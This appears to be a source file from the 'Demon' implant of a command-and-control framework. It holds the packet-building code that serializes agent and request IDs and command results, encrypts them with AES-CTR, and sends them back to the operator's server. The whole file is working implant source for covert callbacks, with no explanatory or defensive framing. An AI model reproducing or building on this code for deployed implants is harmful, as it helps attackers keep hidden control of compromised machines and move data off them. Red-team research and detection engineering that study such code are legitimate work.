/* Import Core Headers */
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Core/Command.h>
#include <Core/Transport.h>

/* Import Crypto Header (enable CTR Mode) */
#define CTR    1
#define AES256 1
#include <Crypt/AesCrypt.h>

VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
{
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
{
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT32 );
}

VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT64 ),
            LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( UINT64 );
}

VOID PackageAddPtr( PPACKAGE Package, PVOID pointer)
{
    PackageAddInt64( Package, ( UINT64 ) pointer );
}

VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    MemCopy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Size   =  Package->Length;
    Package->Length += Size;
}


VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
{
    if ( ! Package && Size ) {
        return;
    }

    PackageAddInt32( Package, Size );

    if ( Size )
    {
        Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );

        MemCopy( Package->Buffer + Package->Length, Data, Size );

        Package->Size   =  Package->Length;
        Package->Length += Size;
    }
}

VOID PackageAddString( PPACKAGE package, PCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthA( data ) );
}

VOID PackageAddWString( PPACKAGE package, PWCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
}

// For callback to server
PPACKAGE PackageCreate( UINT32 CommandID )
{
    PPACKAGE Package = NULL;

    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->RequestID = Instance.CurrentRequestID;
    Package->CommandID = CommandID;
    Package->Encrypt   = TRUE;
    Package->Destroy   = TRUE;

    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
    PackageAddInt32( Package, Instance.Session.AgentID );
    PackageAddInt32( Package, Package->RequestID );
    PackageAddInt32( Package, CommandID );

    return Package;
}

// For callback to server
PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
{
    PPACKAGE Package = NULL;

    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->RequestID = RequestID;
    Package->CommandID = CommandID;
    Package->Encrypt   = TRUE;
    Package->Destroy   = TRUE;

    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
    PackageAddInt32( Package, Instance.Session.AgentID );
    PackageAddInt32( Package, RequestID );
    PackageAddInt32( Package, CommandID );

    return Package;
}

VOID PackageDestroy( PPACKAGE Package )
{
    if ( ! Package ) {
        return;
    }

    if ( ! Package->Buffer ) {
        PUTS( "Package Buffer empty" )
        return;
    }

    MemSet( Package->Buffer, 0, Package->Length );
    Instance.Win32.LocalFree( Package->Buffer );
    Package->Buffer = NULL;

    MemSet( Package, 0, sizeof( PACKAGE ) );
    Instance.Win32.LocalFree( Package );
    Package = NULL;
}

BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
{
    AESCTX AesCtx  = { 0 };
    BOOL   Success = FALSE;
    UINT32 Padding = 0;

    if ( Package )
    {
        if ( ! Package->Buffer ) {
            PUTS( "Package->Buffer is empty" )
            return FALSE;
        }

        // writes package length to buffer
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( Package->Encrypt )
        {
            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

            /* only add these on init or key exchange */
            if ( Package->CommandID == DEMON_INITIALIZE ) {
                Padding += 32 + 16;
            }

            AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
            Success = TRUE;
        } else {
            PUTS("TransportSend failed!")
        }

        if ( Package->Destroy ) {
            PackageDestroy( Package );
        } else if ( Package->Encrypt ) {
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }
    } else {
        PUTS( "Package is empty" )
        Success = FALSE;
    }

    return Success;
}

VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
{
    PPACKAGE Package = NULL;

    PRINTF( "Transmit Error: %d\n", ErrorCode );

    Package = PackageCreate( DEMON_ERROR );

    PackageAddInt32( Package, ID );
    PackageAddInt32( Package, ErrorCode );
    PackageTransmit( Package, NULL, NULL );
}

